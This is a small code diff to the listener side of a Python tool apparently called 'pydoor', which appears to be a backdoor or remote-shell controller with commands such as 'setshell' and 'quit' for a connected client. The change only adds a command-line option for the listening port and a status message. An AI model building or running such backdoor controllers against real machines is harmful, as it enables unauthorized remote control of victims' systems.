@@ -3,6 +3,8 @@
 import socket
 import time
 import sys
+import argparse
+
 
 BUFFER = 4096
 
@@ -28,6 +30,18 @@ setshell [absolute/path/to/shell] | Change the shell that the integrated shell w
         """
 
         self.quitwarning = """WARNING : Running quit will kill the client program, proceed ? [Y/n]: """
+        self.args = 0
+        self.port = 0
+
+
+    def parse_args(self):
+        parser = argparse.ArgumentParser(
+            description='pydoor_decription.')
+        parser.add_argument('-p', '--port', default=9999, help='Port to listen on for client connection.', type=int)
+        self.args = parser.parse_args()
+        self.port = self.args.port
+
+
 
     def handle_response(self, resp):
         if "pydoor.quit" in resp:
@@ -70,6 +84,8 @@ setshell [absolute/path/to/shell] | Change the shell that the integrated shell w
 
     def start(self):
 
+        self.parse_args()
+
         print("Starting server")
 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -77,9 +93,11 @@ setshell [absolute/path/to/shell] | Change the shell that the integrated shell w
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 
-        self.sock.bind(("127.0.0.1", 9999))
+        self.sock.bind(("127.0.0.1", self.port))
 
         self.sock.listen(1)
+
+        print(f"Listening on {self.port}, waiting for connection from client")
 
         while True:
             
